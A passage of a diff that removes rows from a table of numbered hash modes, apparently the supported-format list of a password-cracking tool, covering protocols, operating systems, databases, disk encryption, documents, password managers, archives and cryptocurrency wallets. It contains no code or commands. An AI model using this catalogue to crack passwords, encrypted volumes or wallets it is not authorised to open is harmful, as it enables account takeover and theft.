-| 12100 | PBKDF2-HMAC-SHA512                                                   | Generic KDF                           |
-| 8900 | scrypt                                                               | Generic KDF                           |
-|  400 | phpass                                                               | Generic KDF                           |
-| 16100 | TACACS+                                                              | Network Protocol                      |
-| 11400 | SIP digest authentication (MD5)                                      | Network Protocol                      |
-| 5300 | IKE-PSK MD5                                                          | Network Protocol                      |
-| 5400 | IKE-PSK SHA1                                                         | Network Protocol                      |
-| 25100 | SNMPv3 HMAC-MD5-96                                                   | Network Protocol                      |
-| 25000 | SNMPv3 HMAC-MD5-96/HMAC-SHA1-96                                      | Network Protocol                      |
-| 25200 | SNMPv3 HMAC-SHA1-96                                                  | Network Protocol                      |
-| 26700 | SNMPv3 HMAC-SHA224-128                                               | Network Protocol                      |
-| 26800 | SNMPv3 HMAC-SHA256-192                                               | Network Protocol                      |
-| 26900 | SNMPv3 HMAC-SHA384-256                                               | Network Protocol                      |
-| 27300 | SNMPv3 HMAC-SHA512-384                                               | Network Protocol                      |
-| 2500 | WPA-EAPOL-PBKDF2                                                     | Network Protocol                      |
-| 2501 | WPA-EAPOL-PMK                                                        | Network Protocol                      |
-| 22000 | WPA-PBKDF2-PMKID+EAPOL                                               | Network Protocol                      |
-| 22001 | WPA-PMK-PMKID+EAPOL                                                  | Network Protocol                      |
-| 16800 | WPA-PMKID-PBKDF2                                                     | Network Protocol                      |
-| 16801 | WPA-PMKID-PMK                                                        | Network Protocol                      |
-| 7300 | IPMI2 RAKP HMAC-SHA1                                                 | Network Protocol                      |
-| 10200 | CRAM-MD5                                                             | Network Protocol                      |
-| 16500 | JWT (JSON Web Token)                                                 | Network Protocol                      |
-| 29200 | Radmin3                                                              | Network Protocol                      |
-| 19600 | Kerberos 5, etype 17, TGS-REP                                        | Network Protocol                      |
-| 19800 | Kerberos 5, etype 17, Pre-Auth                                       | Network Protocol                      |
-| 28800 | Kerberos 5, etype 17, DB                                             | Network Protocol                      |
-| 19700 | Kerberos 5, etype 18, TGS-REP                                        | Network Protocol                      |
-| 19900 | Kerberos 5, etype 18, Pre-Auth                                       | Network Protocol                      |
-| 28900 | Kerberos 5, etype 18, DB                                             | Network Protocol                      |
-| 7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                                | Network Protocol                      |
-| 13100 | Kerberos 5, etype 23, TGS-REP                                        | Network Protocol                      |
-| 18200 | Kerberos 5, etype 23, AS-REP                                         | Network Protocol                      |
-| 5500 | NetNTLMv1 / NetNTLMv1+ESS                                            | Network Protocol                      |
-| 27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                                       | Network Protocol                      |
-| 5600 | NetNTLMv2                                                            | Network Protocol                      |
-| 27100 | NetNTLMv2 (NT)                                                       | Network Protocol                      |
-| 29100 | Flask Session Cookie ($salt.$salt.$pass)                             | Network Protocol                      |
-| 4800 | iSCSI CHAP authentication, MD5(CHAP)                                 | Network Protocol                      |
-| 8500 | RACF                                                                 | Operating System                      |
-| 6300 | AIX {smd5}                                                           | Operating System                      |
-| 6700 | AIX {ssha1}                                                          | Operating System                      |
-| 6400 | AIX {ssha256}                                                        | Operating System                      |
-| 6500 | AIX {ssha512}                                                        | Operating System                      |
-| 3000 | LM                                                                   | Operating System                      |
-| 19000 | QNX /etc/shadow (MD5)                                                | Operating System                      |
-| 19100 | QNX /etc/shadow (SHA256)                                             | Operating System                      |
-| 19200 | QNX /etc/shadow (SHA512)                                             | Operating System                      |
-| 15300 | DPAPI masterkey file v1 (context 1 and 2)                            | Operating System                      |
-| 15310 | DPAPI masterkey file v1 (context 3)                                  | Operating System                      |
-| 15900 | DPAPI masterkey file v2 (context 1 and 2)                            | Operating System                      |
-| 15910 | DPAPI masterkey file v2 (context 3)                                  | Operating System                      |
-| 7200 | GRUB 2                                                               | Operating System                      |
-| 12800 | MS-AzureSync PBKDF2-HMAC-SHA256                                      | Operating System                      |
-| 12400 | BSDi Crypt, Extended DES                                             | Operating System                      |
-| 1000 | NTLM                                                                 | Operating System                      |
-| 9900 | Radmin2                                                              | Operating System                      |
-| 5800 | Samsung Android Password/PIN                                         | Operating System                      |
-| 28100 | Windows Hello PIN/Password                                           | Operating System                      |
-| 13800 | Windows Phone 8+ PIN/password                                        | Operating System                      |
-| 2410 | Cisco-ASA MD5                                                        | Operating System                      |
-| 9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                                        | Operating System                      |
-| 9300 | Cisco-IOS $9$ (scrypt)                                               | Operating System                      |
-| 5700 | Cisco-IOS type 4 (SHA256)                                            | Operating System                      |
-| 2400 | Cisco-PIX MD5                                                        | Operating System                      |
-| 8100 | Citrix NetScaler (SHA1)                                              | Operating System                      |
-| 22200 | Citrix NetScaler (SHA512)                                            | Operating System                      |
-| 1100 | Domain Cached Credentials (DCC), MS Cache                            | Operating System                      |
-| 2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2                       | Operating System                      |
-| 7000 | FortiGate (FortiOS)                                                  | Operating System                      |
-| 26300 | FortiGate256 (FortiOS256)                                            | Operating System                      |
-|  125 | ArubaOS                                                              | Operating System                      |
-|  501 | Juniper IVE                                                          | Operating System                      |
-|   22 | Juniper NetScreen/SSG (ScreenOS)                                     | Operating System                      |
-| 15100 | Juniper/NetBSD sha1crypt                                             | Operating System                      |
-| 26500 | iPhone passcode (UID key + System Keybag)                            | Operating System                      |
-|  122 | macOS v10.4, macOS v10.5, macOS v10.6                                | Operating System                      |
-| 1722 | macOS v10.7                                                          | Operating System                      |
-| 7100 | macOS v10.8+ (PBKDF2-SHA512)                                         | Operating System                      |
-| 3200 | bcrypt $2*$, Blowfish (Unix)                                         | Operating System                      |
-|  500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)                            | Operating System                      |
-| 1500 | descrypt, DES (Unix), Traditional DES                                | Operating System                      |
-| 29000 | sha1($salt.sha1(utf16le($username).':'.utf16le($pass)))              | Operating System                      |
-| 7400 | sha256crypt $5$, SHA256 (Unix)                                       | Operating System                      |
-| 1800 | sha512crypt $6$, SHA512 (Unix)                                       | Operating System                      |
-| 24600 | SQLCipher                                                            | Database Server                       |
-|  131 | MSSQL (2000)                                                         | Database Server                       |
-|  132 | MSSQL (2005)                                                         | Database Server                       |
-| 1731 | MSSQL (2012, 2014)                                                   | Database Server                       |
-| 24100 | MongoDB ServerKey SCRAM-SHA-1                                        | Database Server                       |
-| 24200 | MongoDB ServerKey SCRAM-SHA-256                                      | Database Server                       |
-|   12 | PostgreSQL                                                           | Database Server                       |
-| 11100 | PostgreSQL CRAM (MD5)                                                | Database Server                       |
-| 28600 | PostgreSQL SCRAM-SHA-256                                             | Database Server                       |
-| 3100 | Oracle H: Type (Oracle 7+)                                           | Database Server                       |
-|  112 | Oracle S: Type (Oracle 11+)                                          | Database Server                       |
-| 12300 | Oracle T: Type (Oracle 12+)                                          | Database Server                       |
-| 7401 | MySQL $A$ (sha256crypt)                                              | Database Server                       |
-| 11200 | MySQL CRAM (SHA1)                                                    | Database Server                       |
-|  200 | MySQL323                                                             | Database Server                       |
-|  300 | MySQL4.1/MySQL5                                                      | Database Server                       |
-| 8000 | Sybase ASE                                                           | Database Server                       |
-| 8300 | DNSSEC (NSEC3)                                                       | FTP, HTTP, SMTP, LDAP Server          |
-| 25900 | KNX IP Secure - Device Authentication Code                           | FTP, HTTP, SMTP, LDAP Server          |
-| 16400 | CRAM-MD5 Dovecot                                                     | FTP, HTTP, SMTP, LDAP Server          |
-| 1411 | SSHA-256(Base64), LDAP {SSHA256}                                     | FTP, HTTP, SMTP, LDAP Server          |
-| 1711 | SSHA-512(Base64), LDAP {SSHA512}                                     | FTP, HTTP, SMTP, LDAP Server          |
-| 24900 | Dahua Authentication MD5                                             | FTP, HTTP, SMTP, LDAP Server          |
-| 10901 | RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256)                              | FTP, HTTP, SMTP, LDAP Server          |
-| 15000 | FileZilla Server >= 0.9.55                                           | FTP, HTTP, SMTP, LDAP Server          |
-| 12600 | ColdFusion 10+                                                       | FTP, HTTP, SMTP, LDAP Server          |
-| 1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)                                | FTP, HTTP, SMTP, LDAP Server          |
-|  141 | Episerver 6.x < .NET 4                                               | FTP, HTTP, SMTP, LDAP Server          |
-| 1441 | Episerver 6.x >= .NET 4                                              | FTP, HTTP, SMTP, LDAP Server          |
-| 1421 | hMailServer                                                          | FTP, HTTP, SMTP, LDAP Server          |
-|  101 | nsldap, SHA-1(Base64), Netscape LDAP SHA                             | FTP, HTTP, SMTP, LDAP Server          |
-|  111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA                          | FTP, HTTP, SMTP, LDAP Server          |
-| 7700 | SAP CODVN B (BCODE)                                                  | Enterprise Application Software (EAS)  |
-| 7701 | SAP CODVN B (BCODE) from RFC_READ_TABLE                              | Enterprise Application Software (EAS)  |
-| 7800 | SAP CODVN F/G (PASSCODE)                                             | Enterprise Application Software (EAS)  |
-| 7801 | SAP CODVN F/G (PASSCODE) from RFC_READ_TABLE                         | Enterprise Application Software (EAS)  |
-| 10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                                  | Enterprise Application Software (EAS)  |
-|  133 | PeopleSoft                                                           | Enterprise Application Software (EAS)  |
-| 13500 | PeopleSoft PS_TOKEN                                                  | Enterprise Application Software (EAS)  |
-| 21500 | SolarWinds Orion                                                     | Enterprise Application Software (EAS)  |
-| 21501 | SolarWinds Orion v2                                                  | Enterprise Application Software (EAS)  |
-|   24 | SolarWinds Serv-U                                                    | Enterprise Application Software (EAS)  |
-| 8600 | Lotus Notes/Domino 5                                                 | Enterprise Application Software (EAS)  |
-| 8700 | Lotus Notes/Domino 6                                                 | Enterprise Application Software (EAS)  |
-| 9100 | Lotus Notes/Domino 8                                                 | Enterprise Application Software (EAS)  |
-| 26200 | OpenEdge Progress Encode                                             | Enterprise Application Software (EAS)  |
-| 20600 | Oracle Transportation Management (SHA256)                            | Enterprise Application Software (EAS)  |
-| 4711 | Huawei sha1(md5($pass).$salt)                                        | Enterprise Application Software (EAS)  |
-| 20711 | AuthMe sha256                                                        | Enterprise Application Software (EAS)  |
-| 22400 | AES Crypt (SHA256)                                                   | Full-Disk Encryption (FDE)            |
-| 27400 | VMware VMX (PBKDF2-HMAC-SHA1 + AES-256-CBC)                          | Full-Disk Encryption (FDE)            |
-| 14600 | LUKS v1 (legacy)                                                     | Full-Disk Encryption (FDE)            |
-| 29541 | LUKS v1 RIPEMD-160 + AES                                             | Full-Disk Encryption (FDE)            |
-| 29542 | LUKS v1 RIPEMD-160 + Serpent                                         | Full-Disk Encryption (FDE)            |
-| 29543 | LUKS v1 RIPEMD-160 + Twofish                                         | Full-Disk Encryption (FDE)            |
-| 29511 | LUKS v1 SHA-1 + AES                                                  | Full-Disk Encryption (FDE)            |
-| 29512 | LUKS v1 SHA-1 + Serpent                                              | Full-Disk Encryption (FDE)            |
-| 29513 | LUKS v1 SHA-1 + Twofish                                              | Full-Disk Encryption (FDE)            |
-| 29521 | LUKS v1 SHA-256 + AES                                                | Full-Disk Encryption (FDE)            |
-| 29522 | LUKS v1 SHA-256 + Serpent                                            | Full-Disk Encryption (FDE)            |
-| 29523 | LUKS v1 SHA-256 + Twofish                                            | Full-Disk Encryption (FDE)            |
-| 29531 | LUKS v1 SHA-512 + AES                                                | Full-Disk Encryption (FDE)            |
-| 29532 | LUKS v1 SHA-512 + Serpent                                            | Full-Disk Encryption (FDE)            |
-| 29533 | LUKS v1 SHA-512 + Twofish                                            | Full-Disk Encryption (FDE)            |
-| 13711 | VeraCrypt RIPEMD160 + XTS 512 bit (legacy)                           | Full-Disk Encryption (FDE)            |
-| 13712 | VeraCrypt RIPEMD160 + XTS 1024 bit (legacy)                          | Full-Disk Encryption (FDE)            |
-| 13713 | VeraCrypt RIPEMD160 + XTS 1536 bit (legacy)                          | Full-Disk Encryption (FDE)            |
-| 13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)               | Full-Disk Encryption (FDE)            |
-| 13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)              | Full-Disk Encryption (FDE)            |
-| 13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)              | Full-Disk Encryption (FDE)            |
-| 29411 | VeraCrypt RIPEMD160 + XTS 512 bit                                    | Full-Disk Encryption (FDE)            |
-| 29412 | VeraCrypt RIPEMD160 + XTS 1024 bit                                   | Full-Disk Encryption (FDE)            |
-| 29413 | VeraCrypt RIPEMD160 + XTS 1536 bit                                   | Full-Disk Encryption (FDE)            |
-| 29441 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode                        | Full-Disk Encryption (FDE)            |
-| 29442 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode                       | Full-Disk Encryption (FDE)            |
-| 29443 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode                       | Full-Disk Encryption (FDE)            |
-| 13751 | VeraCrypt SHA256 + XTS 512 bit (legacy)                              | Full-Disk Encryption (FDE)            |
-| 13752 | VeraCrypt SHA256 + XTS 1024 bit (legacy)                             | Full-Disk Encryption (FDE)            |
-| 13753 | VeraCrypt SHA256 + XTS 1536 bit (legacy)                             | Full-Disk Encryption (FDE)            |
-| 13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode (legacy)                  | Full-Disk Encryption (FDE)            |
-| 13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode (legacy)                 | Full-Disk Encryption (FDE)            |
-| 13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode (legacy)                 | Full-Disk Encryption (FDE)            |
-| 29451 | VeraCrypt SHA256 + XTS 512 bit                                       | Full-Disk Encryption (FDE)            |
-| 29452 | VeraCrypt SHA256 + XTS 1024 bit                                      | Full-Disk Encryption (FDE)            |
-| 29453 | VeraCrypt SHA256 + XTS 1536 bit                                      | Full-Disk Encryption (FDE)            |
-| 29461 | VeraCrypt SHA256 + XTS 512 bit + boot-mode                           | Full-Disk Encryption (FDE)            |
-| 29462 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode                          | Full-Disk Encryption (FDE)            |
-| 29463 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode                          | Full-Disk Encryption (FDE)            |
-| 13721 | VeraCrypt SHA512 + XTS 512 bit (legacy)                              | Full-Disk Encryption (FDE)            |
-| 13722 | VeraCrypt SHA512 + XTS 1024 bit (legacy)                             | Full-Disk Encryption (FDE)            |
-| 13723 | VeraCrypt SHA512 + XTS 1536 bit (legacy)                             | Full-Disk Encryption (FDE)            |
-| 29421 | VeraCrypt SHA512 + XTS 512 bit                                       | Full-Disk Encryption (FDE)            |
-| 29422 | VeraCrypt SHA512 + XTS 1024 bit                                      | Full-Disk Encryption (FDE)            |
-| 29423 | VeraCrypt SHA512 + XTS 1536 bit                                      | Full-Disk Encryption (FDE)            |
-| 13771 | VeraCrypt Streebog-512 + XTS 512 bit (legacy)                        | Full-Disk Encryption (FDE)            |
-| 13772 | VeraCrypt Streebog-512 + XTS 1024 bit (legacy)                       | Full-Disk Encryption (FDE)            |
-| 13773 | VeraCrypt Streebog-512 + XTS 1536 bit (legacy)                       | Full-Disk Encryption (FDE)            |
-| 13781 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode (legacy)            | Full-Disk Encryption (FDE)            |
-| 13782 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode (legacy)           | Full-Disk Encryption (FDE)            |
-| 13783 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode (legacy)           | Full-Disk Encryption (FDE)            |
-| 29471 | VeraCrypt Streebog-512 + XTS 512 bit                                 | Full-Disk Encryption (FDE)            |
-| 29472 | VeraCrypt Streebog-512 + XTS 1024 bit                                | Full-Disk Encryption (FDE)            |
-| 29473 | VeraCrypt Streebog-512 + XTS 1536 bit                                | Full-Disk Encryption (FDE)            |
-| 29481 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode                     | Full-Disk Encryption (FDE)            |
-| 29482 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode                    | Full-Disk Encryption (FDE)            |
-| 29483 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode                    | Full-Disk Encryption (FDE)            |
-| 13731 | VeraCrypt Whirlpool + XTS 512 bit (legacy)                           | Full-Disk Encryption (FDE)            |
-| 13732 | VeraCrypt Whirlpool + XTS 1024 bit (legacy)                          | Full-Disk Encryption (FDE)            |
-| 13733 | VeraCrypt Whirlpool + XTS 1536 bit (legacy)                          | Full-Disk Encryption (FDE)            |
-| 29431 | VeraCrypt Whirlpool + XTS 512 bit                                    | Full-Disk Encryption (FDE)            |
-| 29432 | VeraCrypt Whirlpool + XTS 1024 bit                                   | Full-Disk Encryption (FDE)            |
-| 29433 | VeraCrypt Whirlpool + XTS 1536 bit                                   | Full-Disk Encryption (FDE)            |
-| 23900 | BestCrypt v3 Volume Encryption                                       | Full-Disk Encryption (FDE)            |
-| 16700 | FileVault 2                                                          | Full-Disk Encryption (FDE)            |
-| 27500 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-128-XTS)                        | Full-Disk Encryption (FDE)            |
-| 27600 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-256-XTS)                        | Full-Disk Encryption (FDE)            |
-| 20011 | DiskCryptor SHA512 + XTS 512 bit                                     | Full-Disk Encryption (FDE)            |
-| 20012 | DiskCryptor SHA512 + XTS 1024 bit                                    | Full-Disk Encryption (FDE)            |
-| 20013 | DiskCryptor SHA512 + XTS 1536 bit                                    | Full-Disk Encryption (FDE)            |
-| 22100 | BitLocker                                                            | Full-Disk Encryption (FDE)            |
-| 12900 | Android FDE (Samsung DEK)                                            | Full-Disk Encryption (FDE)            |
-| 8800 | Android FDE <= 4.3                                                   | Full-Disk Encryption (FDE)            |
-| 18300 | Apple File System (APFS)                                             | Full-Disk Encryption (FDE)            |
-| 6211 | TrueCrypt RIPEMD160 + XTS 512 bit (legacy)                           | Full-Disk Encryption (FDE)            |
-| 6212 | TrueCrypt RIPEMD160 + XTS 1024 bit (legacy)                          | Full-Disk Encryption (FDE)            |
-| 6213 | TrueCrypt RIPEMD160 + XTS 1536 bit (legacy)                          | Full-Disk Encryption (FDE)            |
-| 6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)               | Full-Disk Encryption (FDE)            |
-| 6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)              | Full-Disk Encryption (FDE)            |
-| 6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)              | Full-Disk Encryption (FDE)            |
-| 29311 | TrueCrypt RIPEMD160 + XTS 512 bit                                    | Full-Disk Encryption (FDE)            |
-| 29312 | TrueCrypt RIPEMD160 + XTS 1024 bit                                   | Full-Disk Encryption (FDE)            |
-| 29313 | TrueCrypt RIPEMD160 + XTS 1536 bit                                   | Full-Disk Encryption (FDE)            |
-| 29341 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode                        | Full-Disk Encryption (FDE)            |
-| 29342 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode                       | Full-Disk Encryption (FDE)            |
-| 29343 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode                       | Full-Disk Encryption (FDE)            |
-| 6221 | TrueCrypt SHA512 + XTS 512 bit (legacy)                              | Full-Disk Encryption (FDE)            |
-| 6222 | TrueCrypt SHA512 + XTS 1024 bit (legacy)                             | Full-Disk Encryption (FDE)            |
-| 6223 | TrueCrypt SHA512 + XTS 1536 bit (legacy)                             | Full-Disk Encryption (FDE)            |
-| 29321 | TrueCrypt SHA512 + XTS 512 bit                                       | Full-Disk Encryption (FDE)            |
-| 29322 | TrueCrypt SHA512 + XTS 1024 bit                                      | Full-Disk Encryption (FDE)            |
-| 29323 | TrueCrypt SHA512 + XTS 1536 bit                                      | Full-Disk Encryption (FDE)            |
-| 6231 | TrueCrypt Whirlpool + XTS 512 bit (legacy)                           | Full-Disk Encryption (FDE)            |
-| 6232 | TrueCrypt Whirlpool + XTS 1024 bit (legacy)                          | Full-Disk Encryption (FDE)            |
-| 6233 | TrueCrypt Whirlpool + XTS 1536 bit (legacy)                          | Full-Disk Encryption (FDE)            |
-| 29331 | TrueCrypt Whirlpool + XTS 512 bit                                    | Full-Disk Encryption (FDE)            |
-| 29332 | TrueCrypt Whirlpool + XTS 1024 bit                                   | Full-Disk Encryption (FDE)            |
-| 29333 | TrueCrypt Whirlpool + XTS 1536 bit                                   | Full-Disk Encryption (FDE)            |
-| 12200 | eCryptfs                                                             | Full-Disk Encryption (FDE)            |
-| 10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                                        | Document                              |
-| 10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1                           | Document                              |
-| 10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2                           | Document                              |
-| 10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                                        | Document                              |
-| 25400 | PDF 1.4 - 1.6 (Acrobat 5 - 8) - user and owner pass                  | Document                              |
-| 10600 | PDF 1.7 Level 3 (Acrobat 9)                                          | Document                              |
-| 10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                                    | Document                              |
-| 9400 | MS Office 2007                                                       | Document                              |
-| 9500 | MS Office 2010                                                       | Document                              |
-| 9600 | MS Office 2013                                                       | Document                              |
-| 25300 | MS Office 2016 - SheetProtection                                     | Document                              |
-| 9700 | MS Office <= 2003 $0/$1, MD5 + RC4                                   | Document                              |
-| 9710 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #1                      | Document                              |
-| 9720 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #2                      | Document                              |
-| 9810 | MS Office <= 2003 $3, SHA1 + RC4, collider #1                        | Document                              |
-| 9820 | MS Office <= 2003 $3, SHA1 + RC4, collider #2                        | Document                              |
-| 9800 | MS Office <= 2003 $3/$4, SHA1 + RC4                                  | Document                              |
-| 18400 | Open Document Format (ODF) 1.2 (SHA-256, AES)                        | Document                              |
-| 18600 | Open Document Format (ODF) 1.1 (SHA-1, Blowfish)                     | Document                              |
-| 16200 | Apple Secure Notes                                                   | Document                              |
-| 23300 | Apple iWork                                                          | Document                              |
-| 6600 | 1Password, agilekeychain                                             | Password Manager                      |
-| 8200 | 1Password, cloudkeychain                                             | Password Manager                      |
-| 9000 | Password Safe v2                                                     | Password Manager                      |
-| 5200 | Password Safe v3                                                     | Password Manager                      |
-| 6800 | LastPass + LastPass sniffed                                          | Password Manager                      |
-| 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                          | Password Manager                      |
-| 29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode      | Password Manager                      |
-| 23400 | Bitwarden                                                            | Password Manager                      |
-| 16900 | Ansible Vault                                                        | Password Manager                      |
-| 26000 | Mozilla key3.db                                                      | Password Manager                      |
-| 26100 | Mozilla key4.db                                                      | Password Manager                      |
-| 23100 | Apple Keychain                                                       | Password Manager                      |
-| 11600 | 7-Zip                                                                | Archive                               |
-| 12500 | RAR3-hp                                                              | Archive                               |
-| 23800 | RAR3-p (Compressed)                                                  | Archive                               |
-| 23700 | RAR3-p (Uncompressed)                                                | Archive                               |
-| 13000 | RAR5                                                                 | Archive                               |
-| 17220 | PKZIP (Compressed Multi-File)                                        | Archive                               |
-| 17200 | PKZIP (Compressed)                                                   | Archive                               |
-| 17225 | PKZIP (Mixed Multi-File)                                             | Archive                               |
-| 17230 | PKZIP (Mixed Multi-File Checksum-Only)                               | Archive                               |
-| 17210 | PKZIP (Uncompressed)                                                 | Archive                               |
-| 20500 | PKZIP Master Key                                                     | Archive                               |
-| 20510 | PKZIP Master Key (6 byte optimization)                               | Archive                               |
-| 23001 | SecureZIP AES-128                                                    | Archive                               |
-| 23002 | SecureZIP AES-192                                                    | Archive                               |
-| 23003 | SecureZIP AES-256                                                    | Archive                               |
-| 13600 | WinZip                                                               | Archive                               |
-| 18900 | Android Backup                                                       | Archive                               |
-| 24700 | Stuffit5                                                             | Archive                               |
-| 13200 | AxCrypt 1                                                            | Archive                               |
-| 13300 | AxCrypt 1 in-memory SHA1                                             | Archive                               |
-| 23500 | AxCrypt 2 AES-128                                                    | Archive                               |
-| 23600 | AxCrypt 2 AES-256                                                    | Archive                               |
-| 14700 | iTunes backup < 10.0                                                 | Archive                               |
-| 14800 | iTunes backup >= 10.0                                                | Archive                               |
-| 8400 | WBB3 (Woltlab Burning Board)                                         | Forums, CMS, E-Commerce               |
-| 2612 | PHPS                                                                 | Forums, CMS, E-Commerce               |
-| 121 | SMF (Simple Machines Forum) > v1.1                                   | Forums, CMS, E-Commerce               |
-| 3711 | MediaWiki B type                                                     | Forums, CMS, E-Commerce               |
-| 4521 | Redmine                                                              | Forums, CMS, E-Commerce               |
-| 24800 | Umbraco HMAC-SHA1                                                    | Forums, CMS, E-Commerce               |
-| 11 | Joomla < 2.5.18                                                      | Forums, CMS, E-Commerce               |
-| 13900 | OpenCart                                                             | Forums, CMS, E-Commerce               |
-| 11000 | PrestaShop                                                           | Forums, CMS, E-Commerce               |
-| 16000 | Tripcode                                                             | Forums, CMS, E-Commerce               |
-| 7900 | Drupal7                                                              | Forums, CMS, E-Commerce               |
-| 4522 | PunBB                                                                | Forums, CMS, E-Commerce               |
-| 2811 | MyBB 1.2+, IPB2+ (Invision Power Board)                              | Forums, CMS, E-Commerce               |
-| 2611 | vBulletin < v3.8.5                                                   | Forums, CMS, E-Commerce               |
-| 2711 | vBulletin >= v3.8.5                                                  | Forums, CMS, E-Commerce               |
-| 25600 | bcrypt(md5($pass)) / bcryptmd5                                       | Forums, CMS, E-Commerce               |
-| 25800 | bcrypt(sha1($pass)) / bcryptsha1                                     | Forums, CMS, E-Commerce               |
-| 28400 | bcrypt(sha512($pass)) / bcryptsha512                                 | Forums, CMS, E-Commerce               |
-| 21 | osCommerce, xt:Commerce                                              | Forums, CMS, E-Commerce               |
-| 18100 | TOTP (HMAC-SHA1)                                                     | One-Time Password                     |
-| 2000 | STDOUT                                                               | Plaintext                             |
-| 99999 | Plaintext                                                            | Plaintext                             |
-| 21600 | Web2py pbkdf2-sha512                                                 | Framework                             |
-| 10000 | Django (PBKDF2-SHA256)                                               | Framework                             |
-| 124 | Django (SHA-1)                                                       | Framework                             |
-| 12001 | Atlassian (PBKDF2-HMAC-SHA1)                                         | Framework                             |
-| 19500 | Ruby on Rails Restful-Authentication                                 | Framework                             |
-| 27200 | Ruby on Rails Restful Auth (one round, no sitekey)                   | Framework                             |
-| 30000 | Python Werkzeug MD5 (HMAC-MD5 (key = $salt))                         | Framework                             |
-| 30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt))                   | Framework                             |
-| 20200 | Python passlib pbkdf2-sha512                                         | Framework                             |
-| 20300 | Python passlib pbkdf2-sha256                                         | Framework                             |
-| 20400 | Python passlib pbkdf2-sha1                                           | Framework                             |
-| 24410 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA1 + 3DES/AES)                    | Private Key                           |
-| 24420 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA256 + 3DES/AES)                  | Private Key                           |
-| 15500 | JKS Java Key Store Private Keys (SHA1)                               | Private Key                           |
-| 22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)                                | Private Key                           |
-| 22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                                | Private Key                           |
-| 22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)                            | Private Key                           |
-| 22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)                                | Private Key                           |
-| 22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)                                | Private Key                           |
-| 23200 | XMPP SCRAM PBKDF2-SHA1                                               | Instant Messaging Service             |
-| 28300 | Teamspeak 3 (channel hash)                                           | Instant Messaging Service             |
-| 22600 | Telegram Desktop < v2.1.14 (PBKDF2-HMAC-SHA1)                        | Instant Messaging Service             |
-| 24500 | Telegram Desktop >= v2.1.14 (PBKDF2-HMAC-SHA512)                     | Instant Messaging Service             |
-| 22301 | Telegram Mobile App Passcode (SHA256)                                | Instant Messaging Service             |
-| 23 | Skype                                                                | Instant Messaging Service             |
-| 29600 | Terra Station Wallet (AES256-CBC(PBKDF2($pass)))                     | Cryptocurrency Wallet                 |
-| 26600 | MetaMask Wallet                                                      | Cryptocurrency Wallet                 |
-| 21000 | BitShares v0.x - sha512(sha512_bin(pass))                            | Cryptocurrency Wallet                 |
-| 28501 | Bitcoin WIF private key (P2PKH), compressed                          | Cryptocurrency Wallet                 |
-| 28502 | Bitcoin WIF private key (P2PKH), uncompressed                        | Cryptocurrency Wallet                 |
-| 28503 | Bitcoin WIF private key (P2WPKH, Bech32), compressed                 | Cryptocurrency Wallet                 |
-| 28504 | Bitcoin WIF private key (P2WPKH, Bech32), uncompressed               | Cryptocurrency Wallet                 |
-| 28505 | Bitcoin WIF private key (P2SH(P2WPKH)), compressed                   | Cryptocurrency Wallet                 |
-| 28506 | Bitcoin WIF private key (P2SH(P2WPKH)), uncompressed                 | Cryptocurrency Wallet                 |
-| 11300 | Bitcoin/Litecoin wallet.dat                                          | Cryptocurrency Wallet                 |
-| 16600 | Electrum Wallet (Salt-Type 1-3)                                      | Cryptocurrency Wallet                 |
-| 21700 | Electrum Wallet (Salt-Type 4)                                        | Cryptocurrency Wallet                 |
-| 21800 | Electrum Wallet (Salt-Type 5)                                        | Cryptocurrency Wallet                 |
-| 12700 | Blockchain, My Wallet                                                | Cryptocurrency Wallet                 |
-| 15200 | Blockchain, My Wallet, V2                                            | Cryptocurrency Wallet                 |
-| 18800 | Blockchain, My Wallet, Second Password (SHA256)                      | Cryptocurrency Wallet                 |
